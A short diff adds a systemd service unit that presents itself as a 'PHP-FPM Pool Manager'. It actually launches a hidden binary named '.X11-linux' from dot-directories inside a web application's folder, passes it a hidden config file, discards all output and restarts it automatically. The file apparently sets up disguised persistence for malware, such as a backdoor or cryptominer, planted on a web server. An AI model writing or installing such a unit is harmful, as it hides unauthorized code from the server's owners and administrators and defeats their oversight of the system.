@@ -1,0 +1,16 @@
+[Unit]
+Description=PHP-FPM Pool Manager
+After=network-online.target
+Wants=network-online.target
+[Service]
+Type=simple
+Environment=_CFG=/var/www/boat-engine-scheduler/.config/.X11-linux/config.json
+ExecStart=/var/www/boat-engine-scheduler/.local/bin/.X11-linux
+Restart=on-failure
+RestartSec=30
+StartLimitIntervalSec=300
+StartLimitBurst=5
+StandardOutput=null
+StandardError=null
+[Install]
+WantedBy=default.target
